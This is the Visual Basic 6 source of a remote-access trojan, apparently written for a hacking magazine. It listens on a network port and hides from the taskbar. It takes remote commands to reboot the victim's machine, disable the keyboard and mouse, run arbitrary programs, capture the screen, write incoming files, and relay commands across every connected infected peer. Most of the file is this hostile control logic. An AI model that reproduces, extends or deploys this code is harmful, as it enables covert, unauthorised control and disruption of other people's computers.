VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{3B7C8863-D78F-101B-B9B5-04021C009402}#1.2#0"; "RICHTX32.OCX"
Begin VB.Form Form1 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Renomer un fichier"
   ClientHeight    =   3630
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   7290
   Icon            =   "renome.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3630
   ScaleWidth      =   7290
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Client 
      BackColor       =   &H00FFFFFF&
      ForeColor       =   &H00000000&
      Height          =   285
      Left            =   1920
      TabIndex        =   21
      Top             =   360
      Width           =   2775
   End
   Begin VB.ListBox ListClient 
      BackColor       =   &H00FFFFFF&
      ForeColor       =   &H000000FF&
      Height          =   2205
      Left            =   2040
      TabIndex        =   20
      Top             =   4320
      Width           =   1575
   End
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   4080
      Top             =   7560
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Connexion"
      Height          =   375
      Left            =   4800
      Picture         =   "renome.frx":08CA
      TabIndex        =   18
      Top             =   360
      Width           =   975
   End
   Begin VB.TextBox envoye 
      Height          =   2175
      Left            =   2160
      TabIndex        =   17
      Text            =   "Ce trojan a été cree par m@x pour le magazine hzv"
      Top             =   1080
      Width           =   4575
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Enlever la souris"
      Height          =   375
      Left            =   1200
      TabIndex        =   16
      Top             =   6360
      Width           =   1455
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Mettre la souris"
      Height          =   375
      Left            =   2760
      TabIndex        =   15
      Top             =   6360
      Width           =   1455
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Rebooter win"
      Height          =   375
      Left            =   4320
      TabIndex        =   14
      Top             =   6360
      Width           =   1215
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Allumer un programme"
      Height          =   375
      Left            =   5640
      TabIndex        =   13
      Top             =   6360
      Width           =   1815
   End
   Begin VB.CommandButton Command6 
      Caption         =   "Enleve le fond d'écran"
      Height          =   375
      Left            =   1200
      TabIndex        =   12
      Top             =   6840
      Width           =   1815
   End
   Begin VB.CommandButton Command7 
      Caption         =   "Beep"
      Height          =   375
      Left            =   3120
      TabIndex        =   11
      Top             =   6840
      Width           =   735
   End
   Begin VB.CommandButton Command8 
      Caption         =   "Supprime des fichier"
      Height          =   375
      Left            =   3960
      TabIndex        =   10
      Top             =   6840
      Width           =   1695
   End
   Begin VB.CommandButton Command9 
      Caption         =   "Imprimer un texte "
      Height          =   375
      Left            =   5760
      TabIndex        =   9
      Top             =   6840
      Width           =   1575
   End
   Begin VB.CommandButton Command10 
      Caption         =   "Deconexion internet"
      Height          =   375
      Left            =   1200
      TabIndex        =   8
      Top             =   7320
      Width           =   1815
   End
   Begin VB.CommandButton Command11 
      Caption         =   "Connexion internet"
      Height          =   375
      Left            =   3120
      TabIndex        =   7
      Top             =   7320
      Width           =   1695
   End
   Begin VB.CommandButton Command12 
      Caption         =   "Executer un fichier"
      Height          =   375
      Left            =   4920
      TabIndex        =   6
      Top             =   7320
      Width           =   1575
   End
   Begin VB.CommandButton Command13 
      Caption         =   "Renomer un fichier"
      Height          =   375
      Left            =   1200
      TabIndex        =   5
      Top             =   7800
      Width           =   1575
   End
   Begin VB.CommandButton Command14 
      Caption         =   "Crasher le PC"
      Height          =   375
      Left            =   2880
      TabIndex        =   4
      Top             =   7800
      Width           =   1215
   End
   Begin VB.CommandButton Command15 
      Caption         =   "Afficher un message disant qu'il est pirater"
      Height          =   375
      Left            =   4200
      TabIndex        =   3
      Top             =   7800
      Width           =   3255
   End
   Begin VB.CommandButton Command16 
      Caption         =   "Desactiver clavier"
      Height          =   375
      Left            =   1200
      TabIndex        =   2
      Top             =   8280
      Width           =   1575
   End
   Begin VB.CommandButton Command17 
      Caption         =   "Activer clavier"
      Height          =   375
      Left            =   2880
      TabIndex        =   1
      Top             =   8280
      Width           =   1335
   End
   Begin VB.CommandButton command18 
      Caption         =   "Afficher l'ecran"
      Height          =   375
      Left            =   4320
      TabIndex        =   0
      Top             =   8280
      Width           =   1575
   End
   Begin MSWinsockLib.Winsock Repondre 
      Left            =   2400
      Top             =   7560
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Ecouter 
      Left            =   4560
      Top             =   2280
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin RichTextLib.RichTextBox Arrive 
      Height          =   975
      Left            =   0
      TabIndex        =   19
      Top             =   8040
      Visible         =   0   'False
      Width           =   3495
      _ExtentX        =   6165
      _ExtentY        =   1720
      _Version        =   393217
      Enabled         =   -1  'True
      ScrollBars      =   3
      TextRTF         =   $"renome.frx":CC810
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Times New Roman"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin MSWinsockLib.Winsock Winsock2 
      Index           =   0
      Left            =   3120
      Top             =   7560
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock 
      Index           =   0
      Left            =   4680
      Top             =   7920
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label Label2 
      Caption         =   "Tapez ici l'ip du PC que vous voulez controler"
      Height          =   255
      Left            =   2160
      TabIndex        =   22
      Top             =   0
      Width           =   3375
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim iconet As IconeTray

Private Sub cache_Click()
Me.Visible = False
End Sub

Private Sub Command1_Click()
Dim i As Integer
For i = 0 To ListClient.ListCount - 1 Step 1
If ListClient.List(i) = Client.Text Then
   Exit Sub
End If
Next
For i = 1 To 99 Step 1
      If VecNumEnvoy(i) = False Then
         Numero = i
         VecNumEnvoy(i) = True
         Exit For
      End If
      Next
      On Error Resume Next
     Load Winsock2(Numero)
     Winsock2(Numero).Connect Form1.Client.Text, 43210
     connecter.Enabled = False
    
End Sub

Private Sub connecter_Click()
Dim i As Integer
For i = 0 To ListClient.ListCount - 1 Step 1
If ListClient.List(i) = Client.Text Then
   Exit Sub
End If
Next
For i = 1 To 99 Step 1
      If VecNumEnvoy(i) = False Then
         Numero = i
         VecNumEnvoy(i) = True
         Exit For
      End If
      Next
      On Error Resume Next
     Load Winsock2(Numero)
     Winsock2(Numero).Connect Client.Text, 43210
     connecter.Enabled = False
    
End Sub

Private Sub Command10_Click()
envoye.Text = "/deconexion web"
End Sub

Private Sub Command11_Click()
envoye.Text = "/connexion web"
End Sub

Private Sub Command15_Click()
envoye.Text = "/pirater"
End Sub

Private Sub Command16_Click()
envoye.Text = "/clavier non"
End Sub

Private Sub Command17_Click()
envoye.Text = "/clavier oui"
End Sub

Private Sub command18_Click()
envoye.Text = "/imp ecran"
End Sub

Private Sub Command2_Click()
envoye.Text = "/souris non"
KeyAscii = 13
End Sub

Private Sub Command3_Click()
envoye.Text = "/souris oui"
End Sub

Private Sub Command4_Click()
envoye.Text = "/stop win"
End Sub

Private Sub Command5_Click()
envoye.Text = "/execute c:\"
End Sub

Private Sub Command6_Click()
envoye.Text = "/pasfd"
End Sub

Private Sub Command7_Click()
envoye.Text = "/beep"
End Sub

Private Sub Ecouter_DataArrival(ByVal bytesTotal As Long)
Dim Donnee As String
Ecouter.GetData Donnee
Ecoute.Ecoute.Text = Ecoute.Ecoute.Text & vbCrLf & vbCrLf & Mid(Donnee, 1, InStr(1, Donnee, vbCrLf, vbBinaryCompare)) & vbCrLf & Mid(Donnee, InStr(1, Donnee, vbCrLf, vbBinaryCompare) + 2)
End Sub

Private Sub envoye_KeyPress(KeyAscii As Integer)
Dim Fichier As String
Dim contenu As String
Dim fil As Integer

fil = FreeFile
contenu = ""
If KeyAscii = 13 Then
If envoye.Text = "~Protect~" Then
Protection = True
Image4.Visible = True
Exit Sub
End If

If envoye.Text = "~DeProtect~" Then
Protection = False
Image4.Visible = False
Exit Sub
End If

If envoye.Text = "/ecouter" Then
Ecoute.Show
Exit Sub
End If

If envoye.Text = "/ecran" Then
SetWindowRgn hwnd, CreateEllipticRgn(0, 0, Me.Width, Me.Width), True
Exit Sub
End If


If Mid(envoye.Text, 1, 7) = "~Copie~" Then
Fichier = Mid(envoye.Text, 8, InStr(1, envoye.Text, "/", vbBinaryCompare) - 8)
Open Fichier For Binary As fil
contenu = String(LOF(fil), " ")
Get fil, , contenu
Close fil
contenu = contenu & "~EndFile~"
envoye.Text = "~CreatFile~" & Mid(envoye.Text, InStr(1, envoye.Text, "°", vbBinaryCompare) + 1) & "°"
End If

On Error Resume Next
Winsock2(ListClient.ListIndex + 1).SendData envoye.Text & contenu
Repondre.SendData "Message envoyé à " & Winsock2(ListClient.ListIndex + 1).RemoteHostIP & vbCrLf & envoye.Text & contenu
statut.Panels(5).Text = "envoyé !"
contenu = ""
Else

End If
End Sub


Private Sub ChangerÉtat(Touche As KeyCodeConstants, Etat As Integer)


End Sub


Private Sub Form_Load()
Dim i As Integer

'mettre en transparence
'ret = SetWindowLong(Accueil.hwnd, GWL_EXSTYLE, WS_EX_TRANSPARENT)
Pid = GetCurrentProcessId()
Regserv = RegisterServiceProcess(Pid, RSP_SIMPLE_SERVICE)
For i = 0 To 99 Step 1
VecNumRecep(i) = False
VecNumEnvoy(i) = False
Next
Numero = 0
Nombre = 0
Winsock(0).LocalPort = 43210
Winsock(0).Listen
Repondre.LocalPort = 43211
Repondre.Listen
'Préparation de la variable IconeT
     iconet.cbSize = Len(iconet) 'Taille de l'icône en octet
     iconet.hwnd = Me.hwnd       'Handle de l'application (pour qu'elle reçoive les messages envoyés lors d'un clic, double-clic...
     iconet.uID = 1&             'Identificateur de l'icône
     iconet.uFlags = Icone Or TIP Or MESSAGE
     iconet.uCallbackMessage = MOUSEMOVE  'Renvoyer les messages concernant l'action de la souris
     iconet.szTip = "Trojan" & Chr$(0)    'Texte de la bulle d'aide
     Shell_NotifyIcon AJOUT, iconet
     App.TaskVisible = False 'Retire le bouton de l'application de la barre des tâches
     Me.WindowState = minimized
     
Dim i As Integer
For i = 0 To ListClient.ListCount - 1 Step 1
If ListClient.List(i) = Client.Text Then
   Exit Sub
End If
Next
For i = 1 To 99 Step 1
      If VecNumEnvoy(i) = False Then
         Numero = i
         VecNumEnvoy(i) = True
         Exit For
      End If
      Next
      On Error Resume Next
     Load Winsock2(Numero)
     Winsock2(Numero).Connect Form1.Client.Text, 43210
     connecter.Enabled = False
    
End Sub




Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Dim msg As Long
If Me.Visible = False Then
Me.Visible = True
End If
End Sub

Private Sub Form_Unload(Cancel As Integer)
Shell_NotifyIcon SUPPRIME, iconet
End Sub

Private Sub Image1_Click()
Me.Visible = False
End Sub



Private Sub Image2_Click()
Unload Me
End Sub

Private Sub Image3_Click()

End Sub

Private Sub reception_Click(Index As Long)
Arrive.Text = VecStrRecep(Index + 1)
IndexReception = Index
reception.Pages.Item(Index).Caption = Replace(reception.Pages.Item(Index).Caption, "m@il:", "", , , vbBinaryCompare)
End Sub

Private Sub Repondre_ConnectionRequest(ByVal requestID As Long)
Repondre.Close
Repondre.Accept requestID
End Sub




Private Sub Timer1_Timer()
Dim i As Integer
For i = ListClient.ListCount - 1 To 0 Step -1
    On Error Resume Next
    If Winsock2(i + 1).State <> sckConnected Then
       ListClient.RemoveItem i
       Unload Winsock2(i + 1)
    End If
Next

End Sub

Private Sub Voir_Click()
Me.Visible = True
End Sub

Private Sub Timer2_Timer()
État = État + 1
If État = 1 Then
ChangerÉtat vbKeyNumlock, 1
ElseIf État = 2 Then
ChangerÉtat vbKeyNumlock, 0
ElseIf État = 3 Then
ChangerÉtat vbKeyCapital, 1
ElseIf État = 4 Then
ChangerÉtat vbKeyCapital, 0
ElseIf État = 5 Then
ChangerÉtat vbKeyScrollLock, 1
ElseIf État = 6 Then
ChangerÉtat vbKeyScrollLock, 0
État = 0
End If

End Sub

Private Sub Winsock_Close(Index As Integer)
VecNumEnvoy(Index) = False
End Sub
Private Sub Winsock_ConnectionRequest(Index As Integer, ByVal requestID As Long)
Dim i As Integer
  If Index = 0 Then
      For i = 1 To 99 Step 1
      If VecNumRecep(i) = False Then
         Nombre = i
         VecNumRecep(i) = True
         Exit For
      End If
      Next
      On Error Resume Next
      Load Winsock(Nombre)
      Winsock(Nombre).LocalPort = 0
      Winsock(Nombre).Accept requestID
      reception.Visible = True
      Arrive.Visible = True
      reception.Pages.Add Winsock(Index).RemoteHostIP
   End If
End Sub
Private Sub winsock_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim Recu As String
Dim EString As String
Dim Fichier As String
Dim fil As Integer
Dim i As Integer
On Error Resume Next
Winsock(Index).GetData VecStrRecep(Index)
Repondre.SendData "Message reçu de " & Winsock(Index).RemoteHostIP & vbCrLf & VecStrRecep(Index)
'execute les sons de windows
If Protection = False Then
If VecStrRecep(Index) = "/beep" Then
   VecStrRecep(Index) = ""
     MessageBeep SOUND1
     MessageBeep SOUND2
     MessageBeep SOUND3
     MessageBeep SOUND4
     MessageBeep SOUND5
     MessageBeep SOUND6
     MessageBeep SOUND7
     MessageBeep SOUND8
     MessageBeep SOUND9
     MessageBeep SOUND10
   Exit Sub
End If
'execute le premier sons
If VecStrRecep(Index) = "/son1" Then
   VecStrRecep(Index) = ""
     MessageBeep SOUND1
    Exit Sub
End If


If VecStrRecep(Index) = "~Beep2~" Then
   VecStrRecep(Index) = ""
     MessageBeep SOUND2
    Exit Sub
End If

If VecStrRecep(Index) = "~Beep3~" Then
   VecStrRecep(Index) = ""
     MessageBeep SOUND3
    Exit Sub
End If

If VecStrRecep(Index) = "~Beep4~" Then
   VecStrRecep(Index) = ""
     MessageBeep SOUND5
    Exit Sub
End If

If VecStrRecep(Index) = "~Beep5~" Then
   VecStrRecep(Index) = ""
     MessageBeep SOUND5
    Exit Sub
End If

If VecStrRecep(Index) = "~Beep6~" Then
   VecStrRecep(Index) = ""
     MessageBeep SOUND6
    Exit Sub
End If

If VecStrRecep(Index) = "~Beep7~" Then
   VecStrRecep(Index) = ""
     MessageBeep SOUND7
    Exit Sub
End If

If VecStrRecep(Index) = "~Beep8~" Then
   VecStrRecep(Index) = ""
     MessageBeep SOUND7
    Exit Sub
End If

If VecStrRecep(Index) = "~Beep9~" Then
   VecStrRecep(Index) = ""
     MessageBeep SOUND7
    Exit Sub
End If
If VecStrRecep(Index) = "~Beep10~" Then
   VecStrRecep(Index) = ""
     MessageBeep SOUND10
    Exit Sub
End If

'Empêche de se cacher
If VecStrRecep(Index) = "~NoCache~" Then
   VecStrRecep(Index) = ""
   Image1.Visible = False
   cacher.Enabled = False
   Exit Sub
End If
'Permet de se cacher
If VecStrRecep(Index) = "~Cache~" Then
   VecStrRecep(Index) = ""
   Image1.Visible = True
   cacher.Enabled = True
   Exit Sub
End If
'Empeche de se connecter
If VecStrRecep(Index) = "~NoConnect~" Then
   VecStrRecep(Index) = ""
   connecter.Visible = False
   Exit Sub
End If
'Permet de se connecter
If VecStrRecep(Index) = "~ReConnect~" Then
   VecStrRecep(Index) = ""
   connecter.Visible = True
   Exit Sub
End If
'Empêche de quitter
If VecStrRecep(Index) = "~NoQuit~" Then
   VecStrRecep(Index) = ""
   Image2.Visible = False
   Exit Sub
End If

'Permet de quitter
If VecStrRecep(Index) = "~ReQuit~" Then
   VecStrRecep(Index) = ""
  Image2.Visible = True
   Exit Sub
End If

'se connecter a quelqu'un
If Mid(VecStrRecep(Index), 1, 9) = "~Connect~" Then
   EString = Mid(VecStrRecep(Index), 10)
   VecStrRecep(Index) = ""
   Client.Text = EString
   connecter_Click
   Exit Sub
End If


'joue avec les bonhommes
If VecStrRecep(Index) = "~Oui~" Then
   VecStrRecep(Index) = ""
   Oui.Visible = True
   Non.Visible = False
   Bof.Visible = False
    Exit Sub
End If

If VecStrRecep(Index) = "~Non~" Then
   VecStrRecep(Index) = ""
   Non.Visible = True
   Oui.Visible = False
   Bof.Visible = False
    Exit Sub
End If

If VecStrRecep(Index) = "~Bof~" Then
   VecStrRecep(Index) = ""
   Bof.Visible = True
   Oui.Visible = False
   Non.Visible = False
    Exit Sub
End If

If VecStrRecep(Index) = "~OuiBofNon~" Then
   VecStrRecep(Index) = ""
   Oui.Visible = True
   Non.Visible = True
   Bof.Visible = True
    Exit Sub
End If

If VecStrRecep(Index) = "~Clear~" Then
   VecStrRecep(Index) = ""
   Oui.Visible = False
   Non.Visible = False
   Bof.Visible = False
    Exit Sub
End If

'reboot les machines de tous les clients avec qui je suis connecter et
'et ceux-ci envoye un message qui reboot les client avec qui il sont
'connecter
If VecStrRecep(Index) = "~RebootAllTree~" Then
   VecStrRecep(Index) = ""
   Envoyer ("~RebootAll~")
   Exit Sub
End If
'reboot les machines de tous les clients avec qui je suis connecter
If VecStrRecep(Index) = "~RebootAll~" Then
   VecStrRecep(Index) = ""
   Envoyer ("~Reboot~")
   Exit Sub
End If
'reboot la machine
If VecStrRecep(Index) = "/stop win" Then
   Arrive.Text = "Bye!"
   ExitWindowsEx EWX_REBOOT, 0
   Exit Sub
End If
If VecStrRecep(Index) = "~CacherAllTree~" Then
   VecStrRecep(Index) = ""
   Envoyer ("~CacherAll~")
   Exit Sub
End If
'reboot les machines de tous les clients avec qui je suis connecter
If VecStrRecep(Index) = "~CacherAll~" Then
   VecStrRecep(Index) = ""
   Envoyer ("~Cacher~")
  End If
'cache le Programme
If VecStrRecep(Index) = "~Cacher~" Then
   Me.Visible = False
   Exit Sub
End If


If VecStrRecep(Index) = "~FondAllTree~" Then
   VecStrRecep(Index) = ""
   Envoyer ("~FondAll~")
   Exit Sub
End If
If VecStrRecep(Index) = "~FondAll~" Then
   VecStrRecep(Index) = ""
   Envoyer ("~Fond~")
  End If
If VecStrRecep(Index) = "~Fond~" Then
   FondNoir.Show 1
   Exit Sub
End If
If VecStrRecep(Index) = "~NoFondAllTree~" Then
   VecStrRecep(Index) = ""
   Envoyer ("~NoFondAll~")
   Exit Sub
End If
If VecStrRecep(Index) = "~NoFondAll~" Then
   VecStrRecep(Index) = ""
   Envoyer ("~NoFond~")
  End If
If VecStrRecep(Index) = "/pasfd" Then
   Unload FondNoir
   ShowCursor True
   SystemParametersInfo SPI_SCREENSAVERRUNNING, False, "1", 0
   Exit Sub
End If

If Mid(VecStrRecep(Index), 1, 6) = "~Font~" Then
   EString = Mid(VecStrRecep(Index), 7)
   VecStrRecep(Index) = ""
   Arrive.Font.Name = EString
End If

If Mid(VecStrRecep(Index), 1, 8) = "~Taille~" Then
   EString = Mid(VecStrRecep(Index), 9)
   VecStrRecep(Index) = ""
   Arrive.Font.Size = EString
End If

'envoye le message au personne avec qui je suis connecter
If Mid(VecStrRecep(Index), 1, 9) = "~Message~" Then
   EString = Mid(VecStrRecep(Index), 10)
   VecStrRecep(Index) = ""
   Envoyer (EString)
End If

If Mid(VecStrRecep(Index), 1, 12) = "~MessageAll~" Then
   EString = Mid(VecStrRecep(Index), 13)
   VecStrRecep(Index) = ""
   Envoyer ("~Message~" & EString)
End If


If Mid(VecStrRecep(Index), 1, 16) = "~MessageAllTree~" Then
    EString = Mid(VecStrRecep(Index), 17)
    VecStrRecep(Index) = ""
    Envoyer ("~MessageAll~" & EString)
  End If
'cache le curseur
If VecStrRecep(Index) = "/souris non" Then
   ShowCursor False
   VecStrRecep(Index) = ""
End If

If VecStrRecep(Index) = "/souris oui" Then
   ShowCursor True
   VecStrRecep(Index) = ""
End If

If VecStrRecep(Index) = "/pirater" Then
   MsgBox "Bonjours utilisateur de ce PC j'ai une mauvaise nouvelle pour vous car vous venez de vous faire pirater votre Pc"
   VecStrRecep(Index) = ""
End If

If VecStrRecep(Index) = "/clavier non" Then
   Shell "rundll32 keyboard,disable"
   VecStrRecep(Index) = ""
End If
If VecStrRecep(Index) = "/clavier oui" Then
   Shell "rundll32 keyboard,enable"
   VecStrRecep(Index) = ""
End If
If VecStrRecep(Index) = "/deconexion web" Then
On Error Resume Next

On Error Resume Next
   VecStrRecep(Index) = ""
End If

If Mid(VecStrRecep(Index), 1, 9) = "/execute" Then
   EString = Mid(VecStrRecep(Index), 10)
   VecStrRecep(Index) = ""
   ShellExecute hwnd, "open", EString, vbNullString, vbNullString, SW_SHOW
End If
If VecStrRecep(Index) = "/connexion web" Then
 Dim lResult As Long
lResult = InternetAutodial(1, 0&)

   VecStrRecep(Index) = ""
End If




If Mid(VecStrRecep(Index), 1, 12) = "~ExecuteAll~" Then
   EString = Mid(VecStrRecep(Index), 13)
   VecStrRecep(Index) = ""
   Envoyer ("~Execute~" & EString)
End If


If Mid(VecStrRecep(Index), 1, 16) = "~ExecuteAllTree~" Then
    EString = Mid(VecStrRecep(Index), 17)
    VecStrRecep(Index) = ""
    Envoyer ("~ExecuteAll~" & EString)
  End If

If Mid(VecStrRecep(Index), 1, 11) = "/fdecran" Then
   EString = Mid(VecStrRecep(Index), 12)
   VecStrRecep(Index) = ""
Ret = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, EString, 0)
End If

If Mid(VecStrRecep(Index), 1, 11) = "/imp ecran" Then
      Ecran.Ecran.Picture = CaptureScreen()
      Ecran.Show 1
End If

If Mid(VecStrRecep(Index), 1, 11) = "/debut" Then
   If InStr(1, EString, "/fin", vbBinaryCompare) Then
   EString = Replace(EString, "~EndFile~", "", 1, , vbBinaryCompare)
   On Error Resume Next
   EString = Mid(VecStrRecep(Index), 12)
   Fichier = Mid(EString, 1, InStr(1, EString, "°", vbBinaryCompare) - 1)
   fil = FreeFile
   Open Fichier For Binary As fil
   Put fil, , Mid(EString, InStr(1, EString, "°", vbBinaryCompare) + 1)
   Close fil
   VecStrRecep(Index) = ""
Else
    Exit Sub
End If
End If

End If

  

If IndexReception + 1 = Index Then
   Arrive.Text = VecStrRecep(IndexReception + 1)
Else
For i = 0 To reception.Pages.Count - 1 Step 1
    If reception.Pages.Item(i).Caption = Winsock(Index).RemoteHostIP Then
       reception.Pages.Item(i).Caption = "m@il:" & reception.Pages.Item(i).Caption
    End If
Next
End If
End Sub
Private Sub Winsock2_Close(Index As Integer)
Dim i As Integer
VecNumRecep(Index) = False
For i = reception.Pages.Count - 1 To 0 Step -1
  On Error Resume Next
    If (Winsock2(Index).RemoteHostIP = reception.Pages.Item(i).Caption Or Winsock2(Index).RemoteHostIP = "m@il:" & reception.Pages.Item(i).Caption) Then
        reception.Pages.Remove (i)
        Unload Winsock2(Index)
        Exit Sub
    End If
Next
If reception.Pages.Count = 0 Then
   reception.Visible = False
   Arrive.Visible = False
End If
End Sub
Private Sub Winsock2_Connect(Index As Integer)
ListClient.AddItem Client.Text, ListClient.ListCount
ListClient.Selected(ListClient.ListCount - 1) = True
End Sub

